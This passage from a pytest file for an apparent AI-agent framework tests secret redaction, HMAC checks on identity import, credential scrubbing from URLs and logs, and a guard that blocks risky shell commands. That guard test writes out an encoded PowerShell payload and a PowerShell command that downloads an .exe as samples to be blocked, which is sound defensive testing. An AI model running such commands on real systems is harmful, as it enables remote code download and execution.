        "sk_live_abcdefghijklmnopqrstuvwxyz",
    ):
        assert looks_like_secret_text(sample), sample
        red = redact_text(f"key={sample}")
        assert sample not in red
        assert "[redacted]" in red
    # Early-out: ordinary prose unchanged (no multi-regex pass)
    prose = "I prefer dark mode and short answers please."
    assert looks_like_secret_text(prose) is False
    assert redact_text(prose) == prose


def test_identity_import_requires_hmac(tmp_path: Path):
    """Missing hmac_hex must fail closed (no decrypt without MAC)."""
    import base64
    import json as _json

    payload = build_identity_payload(
        partner_memory=[{"text": "Likes coffee"}],
        display_name="T",
    )
    path = export_identity(payload, tmp_path / "nohmac.remedy", passphrase="test-pass-12")
    pkg = _json.loads(path.read_text(encoding="utf-8"))
    pkg.pop("hmac_hex", None)
    path.write_text(_json.dumps(pkg), encoding="utf-8")
    with pytest.raises(ValueError, match="HMAC|hmac|fail closed"):
        import_identity(path, passphrase="test-pass-12")
    # Empty hmac also refused
    pkg["hmac_hex"] = ""
    path.write_text(_json.dumps(pkg), encoding="utf-8")
    with pytest.raises(ValueError):
        import_identity(path, passphrase="test-pass-12")
    # Tampered hmac refused
    path = export_identity(payload, tmp_path / "badhmac.remedy", passphrase="test-pass-12")
    pkg = _json.loads(path.read_text(encoding="utf-8"))
    pkg["hmac_hex"] = "0" * 64
    path.write_text(_json.dumps(pkg), encoding="utf-8")
    with pytest.raises(ValueError):
        import_identity(path, passphrase="test-pass-12")


def test_evidence_persist_index_delta_only(tmp_path: Path):
    """persist_index must not re-append the same units every call (thrash)."""
    reset_evidence_ledger("persist_delta")
    led = get_evidence_ledger("persist_delta")
    led.admit_tool_result(
        tool_name="file_read",
        content="read C:\\proj\\a.py ok",
        success=True,
    )
    p1 = led.persist_index(tmp_path)
    assert p1 is not None and p1.is_file()
    lines1 = p1.read_text(encoding="utf-8").strip().splitlines()
    n1 = len(lines1)
    assert n1 >= 1
    # Second persist with no new EU — no growth
    p2 = led.persist_index(tmp_path)
    assert p2 == p1
    lines2 = p1.read_text(encoding="utf-8").strip().splitlines()
    assert len(lines2) == n1
    # New EU then grows
    led.admit_tool_result(
        tool_name="file_read",
        content="read C:\\proj\\b.py ok",
        success=True,
    )
    led.persist_index(tmp_path)
    lines3 = p1.read_text(encoding="utf-8").strip().splitlines()
    assert len(lines3) > n1


def test_log_formatter_redacts_secrets():
    """Structured and text log formatters must not emit raw secret material."""
    import logging

    from remedy.core.logging import StructuredFormatter, TextFormatter

    rec = logging.LogRecord(
        name="remedy.test",
        level=logging.INFO,
        pathname=__file__,
        lineno=1,
        msg="login api_key=sk-abcdefghijklmnopqrstuvwxyz0123 token=x",
        args=(),
        exc_info=None,
    )
    js = StructuredFormatter(color=False).format(rec)
    assert "sk-abcdefghijklmnopqrstuvwxyz0123" not in js
    assert "[redacted]" in js or "api_key" in js
    txt = TextFormatter().format(rec)
    assert "sk-abcdefghijklmnopqrstuvwxyz0123" not in txt


def test_evidence_delta_before_mark_model_call():
    """pointer_block must be non-empty before mark; empty after (order matters)."""
    from remedy.core.metabolism.evidence import get_evidence_ledger, reset_evidence_ledger

    reset_evidence_ledger("eu_order")
    led = get_evidence_ledger("eu_order")
    led.admit_tool_result(
        tool_name="file_read",
        content="ok\npath: C:\\Users\\Administrator\\RemedyAI\\src\\foo.py\n",
        success=True,
    )
    before = led.pointer_block(limit=8)
    assert before
    assert "eu_" in before or "path" in before.lower() or "tool" in before.lower()
    led.mark_model_call()
    after = led.pointer_block(limit=8)
    assert after == ""


def test_spread_force_lowers_bar():
    from remedy.core.spread.planner import plan_spread

    weak = plan_spread("look at auth module please", intent="tool", force=False)
    strong = plan_spread(
        "look at auth and database modules across the codebase",
        intent="tool",
        force=True,
    )
    # force path should be more willing to spread when multi-area
    assert strong.spread or strong.score >= weak.score


def test_skill_genome_protects_multi_success():
    from remedy.core.metabolism.skill_genome import get_skill_genome, reset_skill_genome

    reset_skill_genome()
    g = get_skill_genome()
    for _ in range(3):
        g.record("change-safety", ok=True)
    ph = g.phenotypes["change-safety"]
    assert ph.protected
    g.record("change-safety", ok=False)
    assert ph.fail == 0  # protected


def test_cua_macro_no_typed_secrets():
    from remedy.core.metabolism.cua_macros import get_cua_macros, reset_cua_macros

    reset_cua_macros()
    store = get_cua_macros()
    m = store.observe_chain(
        [
            {"tool": "computer_navigate", "args": {"url": "https://example.com"}},
            {"tool": "computer_type", "args": {"text": "password=supersecret"}},
            {"tool": "computer_click", "args": {"ref": "e1"}},
        ],
        success=True,
    )
    assert m is not None
    blob = json.dumps(m.to_public())
    assert "supersecret" not in blob
    assert "[omitted]" in blob


def test_cua_macro_strips_url_userinfo_and_query():
    from remedy.core.metabolism.cua_macros import get_cua_macros, reset_cua_macros

    reset_cua_macros()
    store = get_cua_macros()
    m = store.observe_chain(
        [
            {
                "tool": "computer_navigate",
                "args": {
                    "url": "https://user:hunter2@example.com/login?token=abc123secret"
                },
            },
            {"tool": "computer_click", "args": {"ref": "submit"}},
        ],
        success=True,
    )
    assert m is not None
    blob = json.dumps(m.to_public())
    assert "hunter2" not in blob
    assert "token=abc123secret" not in blob
    assert "example.com" in blob


def test_skill_genome_atomic_persist(tmp_path: Path):
    from remedy.core.metabolism.skill_genome import get_skill_genome, reset_skill_genome

    reset_skill_genome()
    g = get_skill_genome()
    g.record("demo-skill", ok=True, latency_ms=12.0)
    path = g.persist(home=tmp_path)
    assert path is not None and path.is_file()
    data = json.loads(path.read_text(encoding="utf-8"))
    assert "demo-skill" in data.get("skills", {})
    # No leftover temp files
    leftovers = list((tmp_path / "skill_genome").glob(".phenotypes.*.tmp"))
    assert leftovers == []


def test_action_ir_strips_url_userinfo():
    from remedy.core.metabolism.action_ir import ActionIR

    ir = ActionIR(turn_id="t1", session_id="s1")
    step = ir.add_step(
        tool="computer_navigate",
        arguments={"url": "https://user:hunter2@example.com/login?token=abc"},
        result="ok",
        ok=True,
    )
    blob = json.dumps(step.to_public())
    assert "hunter2" not in blob
    assert "token=abc" not in blob
    assert "example.com" in blob


def test_action_ir_strips_url_userinfo():
    ir = start_action_ir(session_id="ir_url", tier=2)
    ir.add_step(
        tool="computer_navigate",
        arguments={"url": "https://alice:s3cret@example.com/x?tok=abc"},
        result="ok",
        ok=True,
    )
    step = ir.steps[0]
    blob = json.dumps(step.to_public())
    assert "s3cret" not in blob
    assert "tok=abc" not in blob
    assert "example.com" in blob


def test_shadow_blocks_opaque_payload_shell():
    r = rehearse(
        "bash_exec",
        {"command": "powershell -EncodedCommand SQBFAFgA"},
        tier=2,
        work_roots=[r"C:\proj"],
    )
    assert r.blocked
    assert r.outcome == "hard_block"
    r2 = rehearse(
        "bash_exec",
        {"command": "(New-Object Net.WebClient).DownloadFile('http://x','a.exe')"},
        tier=2,
        work_roots=[r"C:\proj"],
    )
    assert r2.blocked


def test_machine_map_scrubs_url_userinfo():
    reset_machine_map("map_scrub")
    mm = get_machine_map("map_scrub")
    mm.put(
        "browser",
        "tab1",
        {"url": "https://bob:hunter2@example.com/app?session=xyz", "title": "App"},
    )
    pub = mm.get("browser", "tab1")
    assert pub is not None
    blob = json.dumps(pub.to_public())
    assert "hunter2" not in blob
    assert "session=xyz" not in blob
    assert "example.com" in blob


def test_governor_compress_earlier_flag():
    from remedy.core.metabolism.governor import get_governor, reset_governor

    reset_governor("gov1")
    g = get_governor("gov1")
    g.observe_and_decide(
        quality={"stuck_rate": 0.25, "max_tool_fail_streak": 4, "turns": 3},
        metabolism={},
        tier=2,
    )
    assert g.compress_earlier


def test_governor_skips_decision_append_when_unchanged():
    """Quiet L1 chat must not grow decisions list every turn."""
    from remedy.core.metabolism.governor import get_governor, reset_governor

    reset_governor("gov_thrash")
    g = get_governor("gov_thrash")
    quiet = {"stuck_rate": 0, "re_explain_rate": 0, "max_tool_fail_streak": 0, "turns": 2}
    meta = {"waste_batch_rate": 0, "evidence_units": 1, "decision_units": 1}
    g.observe_and_decide(quality=quiet, metabolism=meta, tier=1)
    n1 = len(g.decisions)
    g.observe_and_decide(quality=quiet, metabolism=meta, tier=1)
    g.observe_and_decide(quality=quiet, metabolism=meta, tier=1)
    assert len(g.decisions) == n1
    assert g.loop_count >= 3


def test_begin_force_spread_inject():
    meta = begin_turn_metabolism(
        session_id="test_meta_sess",
        user_text="work alone across the whole codebase",
        intent="autonomous",
        tools_enabled=True,
    )
    assert meta["tier"] == 3
    assert meta["force_spread"]
    joined = "\n".join(meta.get("injects") or [])
    assert "Spread" in joined or "spread" in joined.lower()
